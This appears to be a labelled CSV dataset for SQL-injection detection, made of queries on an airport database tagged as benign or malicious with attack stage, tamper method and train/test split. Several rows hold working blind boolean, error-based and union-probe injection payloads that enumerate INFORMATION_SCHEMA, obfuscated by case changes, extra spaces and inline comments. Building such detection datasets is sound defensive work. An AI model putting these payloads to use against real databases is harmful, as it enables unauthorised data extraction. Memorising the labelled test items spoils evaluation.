"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""DM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,DM 2,,,,select,airport-S19,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE gps_code = ""FAMX"" OR local_code = ""L11""",0,FAMX L11,,,,select,airport-S4,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SX"", ""Estonia"", ""AS"", ""Lapangan Terbang Malaysia"")",0,SX Estonia AS Lapangan Terbang Malaysia,,,,insert,airport-I6,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (54192, 38659, ""KGWB"", ""GND"", ""AWOS 3"", 109.7)",0,54192 38659 KGWB GND AWOS 3 109.7,,,,insert,airport-I8,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""ХБО7, Прибойный"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Sharp Central Star Apartments"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""99KY"", ""%"");",0,"ХБО7, Прибойный Sharp Central Star Apartments 99KY",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'KDRI';,0,KDRI,,,,select,airport-S1,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.0 AND  118.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.4  AND  122.8  ORDER BY frequency;",0,120.0 118.1 122.4 122.8,,,,select,airport-S13,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AGOB','AGOB','AGOB','AGOB');",1, AGOB AGOB AGOB AGOB ,recon,randomcase,success,update,airport-U10,time-112,time,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GM"" GROUP BY r.name ORDER BY r.name ASC;",0,GM,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE gps_code = ""LIPV"" OR local_code = ""LF3623""",0,LIPV LF3623,,,,select,airport-S4,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""66CO"",""heliport"", ""Logan Airport"",""https://en.wikipedia.org/wiki/Al_Wajh_Domestic_Airport"",""EU"")",0,66CO heliport Logan Airport https://en.wikipedia.org/wiki/Al_Wajh_Domestic_Airport EU,,,,insert,airport-I3,,,train
"DELETE FROM airport_frequencies WHERE type = ""UNIC"";",0,UNIC,,,,delete,airport-D4,,,test
"SELECT * FROM airport WHERE gps_code = ""GQNM"" OR local_code = ""59WA""",0,GQNM 59WA,,,,select,airport-S4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6059"" AS SIGNED) AND a.iso_country = ""AM"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6059 AM,,,,select,airport-S22,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (27147, ""UT46"", 108.0, ""TURF"", 0, 0)",0,27147 UT46 108.0 TURF 0 0,,,,insert,airport-I9,,,test
"DELETE FROM airport WHERE ident=""IN-0375"";",0,IN-0375,,,,delete,airport-D1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Tree Bies Resort Heliport""",0,Tree Bies Resort Heliport,,,,select,airport-S3,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (70899, 3447, ""YGRU"", ""MISC"", ""CLNC DEL"", 132.05)",0,70899 3447 YGRU MISC CLNC DEL 132.05,,,,insert,airport-I8,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Samarqand Region"" AND 4338 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574),1,1))>48) THEN 4338 ELSE (SELECT 5420 UNION SELECT 3981) END))-- -"";",1," Samarqand Region"" AND 4338 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574),1,1))>48) THEN 4338 ELSE (SELECT 5420 UNION SELECT 3981) END))-- - ",exploit,equaltolike,success,select,airport-S15,boolean-234,boolean,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""JP""",0,JP,,,,select,airport-S6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,UA 2,,,,select,airport-S19,,,test
"SELECT * FROM airport WHERE gps_code = ""YRRB"" OR local_code = ""SJOF""",0,YRRB SJOF,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE name = ""Shilo Heliport"" AND 6730=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 13,1),20,1))>104) THEN 6730 ELSE (SELECT 9683 UNION SELECT 1069) END))-- -"";  ",1," Shilo Heliport"" AND 6730=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 13,1),20,1))>104) THEN 6730 ELSE (SELECT 9683 UNION SELECT 1069) END))-- - ",exploit,sleep2getlock,success,delete,airport-D2,boolean-120,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CN"" GROUP BY r.name ORDER BY r.name ASC;",0,CN,,,,select,airport-S5,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PW"" GROUP BY r.name ORDER BY r.name ASC;",0,PW,,,,select,airport-S16,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""YE-SU"", ""Qabala District"", ""AF"", ""SN"", ""https://en.wikipedia.org/wiki/Atlantique_Department"", ""Airports in (unassigned)"")",0,YE-SU Qabala District AF SN https://en.wikipedia.org/wiki/Atlantique_Department Airports in (unassigned),,,,insert,airport-I4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CV"" GROUP BY r.name ORDER BY r.name ASC;",0,CV,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""CA-QC""",0,AF CA-QC,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SS"" GROUP BY r.name ORDER BY r.name ASC;",0,SS,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SB"" OR c.name LIKE CONCAT(""%"", ""Slovenia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,SB Slovenia 4,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""01KY"", ""heliport"", ""Wantoat Airport"", 12.511918, -84.479103)",0,01KY heliport Wantoat Airport 12.511918 -84.479103,,,,insert,airport-I1,,,test
"DELETE FROM countries WHERE code = ""CF"";",0,CF,,,,delete,airport-D7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""NA4"") OR name LIKE ""SDVL""",0,NA4 SDVL,,,,select,airport-S10,,,test
"SELECT id FROM airports WHERE name LIKE ""%IE8Rh06vHKphExr9d77v%"" AND elevation_feet >= 36.0 AND scheduled_service = ""no"" AND type = ""small_airport""",0,IE8Rh06vHKphExr9d77v 36.0 no small_airport,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Estrela D`Alva Airport"");",0,Fazenda Estrela D`Alva Airport,,,,select,airport-S12,,,test
"SELECT id FROM airports WHERE elevation_feet >= 685.0 AND iso_country = ""US"" AND longitude <= 125.54296 AND scheduled_service = ""no""",0,685.0 US 125.54296 no,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.7 AND  122.175  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  121.625  AND  133.88  ORDER BY frequency;",0,122.7 122.175 121.625 133.88,,,,select,airport-S13,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 222.0 AND 358.0",0,222.0 358.0,,,,select,airport-S2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-3685"", ""small_airport"", ""Dickirson Heliport"", 41.23260116577149"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162787871,(SELECT (ELT(1603=1603,1))),0x71716a7171,0x78))s), 8446744073709551610, 8446744073709551610))) AND ""WCBj"" LIKE ""WCBj, 15.1619)",1," US-3685 small_airport Dickirson Heliport 41.23260116577149"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162787871,(SELECT (ELT(1603=1603,1   ,0x71716a7171,0x78  s  8446744073709551610 8446744073709551610    AND ""WCBj"" LIKE ""WCBj 15.1619 ",recon,sleep2getlock,success,insert,airport-I1,error-1,error,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Baya Biru Airport"");",0,Baya Biru Airport,,,,select,airport-S12,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Savanne"";",0,Savanne,,,,select,airport-S15,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 121.0 AND 919.0",0,121.0 919.0,,,,select,airport-S2,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Voronezh Baltimore Air Base"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Voronezh Baltimore Air Base,,,,select,airport-S14,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""MP-U-A"", ""East Azerbaijan Province"", ""AF"", ""JP"", ""https://en.wikipedia.org/wiki/Kranj"", ""Airports in Escaldes-Engordany Parish"")",0,MP-U-A East Azerbaijan Province AF JP https://en.wikipedia.org/wiki/Kranj Airports in Escaldes-Engordany Parish,,,,insert,airport-I4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BR"" GROUP BY r.name ORDER BY r.name ASC;",0,BR,,,,select,airport-S16,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (85793, ""HMU"", ""Plaza"", ""TACAN"", 400, ""US"")",0,85793 HMU Plaza TACAN 400 US,,,,insert,airport-I10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LA"" GROUP BY r.name ORDER BY r.name ASC;",0,LA,,,,select,airport-S16,,,train
"UPDATE airport_frequencies SET description = ""CTAF"" WHERE airport_ident = ""CYMX"";",0,CTAF CYMX,,,,update,airport-U5,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""HR-05"", ""Melaka"", ""EU"", ""MX"", ""https://en.wikipedia.org/wiki/Heilongjiang"", ""-9569"") or 1195=1626#"")",1, HR-05 Melaka EU MX https://en.wikipedia.org/wiki/Heilongjiang -9569  or 1195=1626# ,recon,lowercase,success,insert,airport-I4,boolean-18,boolean,test
"UPDATE airport_frequencies SET frequency_mhz = 123.4 WHERE type = ""ASOS"";",0,123.4 ASOS,,,,update,airport-U6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""PL"") OR a.elevation_ft > 492.0",0,PL 492.0,,,,select,airport-S11,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CL""     AND  7686=(    SELECT    (    CASE    WHEN     (    ORD(    MID((    SELECT     IFNULL( CAST(  column_name       AS      NCHAR ),0x20)   FROM     INFORMATION_SCHEMA.  COLUMNS     WHERE      table_name    =0x636f756e7472696573     AND  table_schema=0x64617461736574  LIMIT   4,1),3,1))>104)     THEN   7686    ELSE   (    SELECT    6656  UNION        SELECT    3668)     END  ))-- -""",1," CL      AND  7686=(    SELECT    (    CASE    WHEN     (    ORD(    MID((    SELECT     IFNULL( CAST(  column_name       AS      NCHAR ),0x20)   FROM     INFORMATION_SCHEMA.  COLUMNS     WHERE      table_name    =0x636f756e7472696573     AND  table_schema=0x64617461736574  LIMIT   4,1),3,1))>104)     THEN   7686    ELSE   (    SELECT    6656  UNION        SELECT    3668)     END  ))-- - ",exploit,multiplespaces,success,select,airport-S9,boolean-204,boolean,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Sinop_Airport"" WHERE ident = ""JP-3246""",0,https://en.wikipedia.org/wiki/Sinop_Airport JP-3246,,,,update,airport-U3,,,train
"SELECT * FROM airport WHERE gps_code = ""48CO"" OR local_code = ""TMA""",0,48CO TMA,,,,select,airport-S4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 4074=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 6,1),10,1))>84) then 4074 else (select 6998 union select 6848) end))-- -""",1," Jindal Heliport  and 4074=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 6,1),10,1))>84) then 4074 else (select 6998 union select 6848) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CL""     AND    3187=( SELECT   (    CASE       WHEN  (  ORD(    MID(( SELECT      IFNULL(  CAST(  table_name    AS     NCHAR  ),0x20)   FROM  INFORMATION_SCHEMA.  TABLES     WHERE   table_schema=0x64617461736574  LIMIT     5,1),8,1))>1)    THEN  3187   ELSE   ( SELECT   4825  UNION   SELECT   3130)     END    ))-- -""",1," CL      AND    3187=( SELECT   (    CASE       WHEN  (  ORD(    MID(( SELECT      IFNULL(  CAST(  table_name    AS     NCHAR  ),0x20)   FROM  INFORMATION_SCHEMA.  TABLES     WHERE   table_schema=0x64617461736574  LIMIT     5,1),8,1))>1)    THEN  3187   ELSE   ( SELECT   4825  UNION   SELECT   3130)     END    ))-- - ",exploit,multiplespaces,success,select,airport-S9,boolean-204,boolean,test
"UPDATE airport SET name = ""Jourdan Airfield"" WHERE ident = ""SN2P""",0,Jourdan Airfield SN2P,,,,update,airport-U1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-11304"";",0,US-11304,,,,select,airport-S7,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Ozerny Heliport, Вертодром Озёрный, Вертодром Озерный"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SSAZ"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""TA55"", ""%"");",0,"Ozerny Heliport, Вертодром Озёрный, Вертодром Озерный SSAZ TA55",,,,select,airport-S17,,,test
"SELECT id FROM airports WHERE municipality = ""Heth"" AND type IN (""heliport"",""heliport"",""medium_airport"")",0,Heth heliport heliport medium_airport,,,,select,airport-S23,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""BR-1033"";",0,BR-1033,,,,select,airport-S7,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""KI"" OR c.name LIKE CONCAT(""%"", ""Mozambique"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,KI Mozambique 3,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-MA""",0,AS US-MA,,,,select,airport-S8,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""AG"", ""Puerto Rico"", ""AS"", ""Airports in U.S. Virgin Islands"")",0,AG Puerto Rico AS Airports in U.S. Virgin Islands,,,,insert,airport-I6,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZA"" OR c.name LIKE CONCAT(""%"", ""Egypt"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,ZA Egypt 3,,,,select,airport-S20,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""ME26"") OR name LIKE ""Otis Helistop Division of UTC, Raytheon Technologies""",0,"ME26 Otis Helistop Division of UTC, Raytheon Technologies",,,,select,airport-S10,,,test
SELECT * FROM airport WHERE icao_code = 'RPVV';,0,RPVV,,,,select,airport-S1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Woodville Airport""",0,Woodville Airport,,,,select,airport-S3,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""SK"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,SK 3,,,,select,airport-S19,,,test
"DELETE FROM countries WHERE code = ""UA"";",0,UA,,,,delete,airport-D7,,,test
"SELECT id FROM airports WHERE longitude <= -77.80985 AND type IN (""closed"",""closed"") AND elevation_feet BETWEEN 1500.0 AND 143.0 AND scheduled_service LIKE ""no""",0,-77.80985 closed closed 1500.0 143.0 no,,,,select,airport-S23,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 5315.0 AND 1565.0",0,5315.0 1565.0,,,,select,airport-S2,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 240.0 AND 192.0",0,240.0 192.0,,,,select,airport-S2,,,test
"SELECT id FROM airports WHERE iso_country LIKE ""DK"" AND name LIKE ""%6raQNaTEZnBpQ8afOYjc%"" AND elevation_feet >= 39.0",0,DK 6raQNaTEZnBpQ8afOYjc 39.0,,,,select,airport-S23,,,test
"DELETE FROM airport WHERE ident=""CT24"";",0,CT24,,,,delete,airport-D1,,,test
"DELETE FROM airport WHERE name LIKE ""Pfingstweide Airfield"" OR keywords LIKE ""JK8"";  ",0,Pfingstweide Airfield JK8,,,,delete,airport-D3,,,test
"INSERT INTO countries (code, name, continent) VALUES (""TC"", ""Samoa"", ""AF"")",0,TC Samoa AF,,,,insert,airport-I7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GD"" GROUP BY r.name ORDER BY r.name ASC;",0,GD,,,,select,airport-S5,,,train
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""PT"" OR c.name LIKE CONCAT(""%"", ""Switzerland"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,PT Switzerland 3,,,,select,airport-S20,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""CH-SG"", ""Hato Mayor Province"", ""EU"", ""VN"", ""https://en.wikipedia.org/wiki/Gaborone"", ""Airports in Al Mahwit Governorate"")",0,CH-SG Hato Mayor Province EU VN https://en.wikipedia.org/wiki/Gaborone Airports in Al Mahwit Governorate,,,,insert,airport-I4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Kiraso"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""IL09"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Gunam-gun Army Base"", ""%"");",0,Kiraso IL09 Gunam-gun Army Base,,,,select,airport-S17,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 26.0 AND 298.0",0,26.0 298.0,,,,select,airport-S2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""DE-0838"", ""closed"", ""Mooga/Brindley Park Airstrip"", 48.71356, -118.428277, 2858.0)",0,DE-0838 closed Mooga/Brindley Park Airstrip 48.71356 -118.428277 2858.0,,,,insert,airport-I2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Ts'ah bii Kin"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Gorišnica"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Perú"", ""%"");",0,Ts'ah bii Kin Airports in Gorišnica Aeropuertos de Perú,,,,select,airport-S18,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (92718, ""APN"", ""Benbecula"", ""VOR-DME"", 116500, ""CA"")",0,92718 APN Benbecula VOR-DME 116500 CA,,,,insert,airport-I10,,,train
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Metangula Airport"");",0,Metangula Airport,,,,select,airport-S12,,,train
"SELECT id FROM airports WHERE type = ""small_airport"" AND name LIKE ""%sQsalZi6gbg5wwhjPecE%"" OR name LIKE ""%5nh4etbeGC1pHge35Imz%""",0,small_airport sQsalZi6gbg5wwhjPecE 5nh4etbeGC1pHge35Imz,,,,select,airport-S23,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Chrudim Airfield""",0,Chrudim Airfield,,,,select,airport-S3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""RU"" GROUP BY r.name ORDER BY r.name ASC;",0,RU,,,,select,airport-S16,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Rio do Fogo Airport"");",0,Fazenda Rio do Fogo Airport,,,,select,airport-S12,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 1,1),1,1))>104) then 23192 else (select 4664 union select 2945) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 1,1 ,1,1  >104  then 23192 else (select 4664 union select 2945  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (64855, 2265, ""MHSC"", ""INFO"", ""TWR"", 119.6)",0,64855 2265 MHSC INFO TWR 119.6,,,,insert,airport-I8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('17NJ','FAPF','JP-1036','AR-0257');",0,17NJ FAPF JP-1036 AR-0257,,,,update,airport-U10,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Calilabad District"";",0,Calilabad District,,,,select,airport-S15,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""DE""",0,DE,,,,select,airport-S9,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (93357, ""MKT"", ""Muskegon"", ""NDB"")/**/ORDER/**/BY/**/1#"", 245, ""KZ"")",1," 93357 MKT"" Muskegon"" NDB /**/ORDER/**/BY/**/1# 245 KZ ",recon,space2comment,failure,insert,airport-I10,union-56,union,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Viana do Castelo District"";",0,Viana do Castelo District,,,,select,airport-S15,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MT"" OR c.name LIKE CONCAT(""%"", ""Germany"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,MT Germany 3,,,,select,airport-S20,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""NE"" GROUP BY r.name ORDER BY r.name ASC;",0,NE,,,,select,airport-S5,,,train
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Puka-Puka_Airport"" WHERE ident = ""SNVC""",0,https://en.wikipedia.org/wiki/Puka-Puka_Airport SNVC,,,,update,airport-U3,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-MA""",0,EU US-MA,,,,select,airport-S8,,,test
"SELECT id FROM airports WHERE longitude <= -63.021597 AND scheduled_service LIKE ""no"" AND elevation_feet <= 1165.0 AND iso_country = ""CO"" AND name LIKE ""%2TF271005H5BBto3JwJm%"" AND type IN (""medium_airport"",""small_airport"",""small_airport"") AND latitude BETWEEN 25.5385 AND 16.316799",0,-63.021597 no 1165.0 CO 2TF271005H5BBto3JwJm medium_airport small_airport small_airport 25.5385 16.316799,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fort Victoria Tower C Helipad"");",0,Fort Victoria Tower C Helipad,,,,select,airport-S12,,,test
SELECT * FROM airport WHERE icao_code = 'ZWHM';,0,ZWHM,,,,select,airport-S1,,,test
SELECT * FROM airport WHERE icao_code = 'WPDL';,0,WPDL,,,,select,airport-S1,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""FR""",0,FR,,,,select,airport-S9,,,test
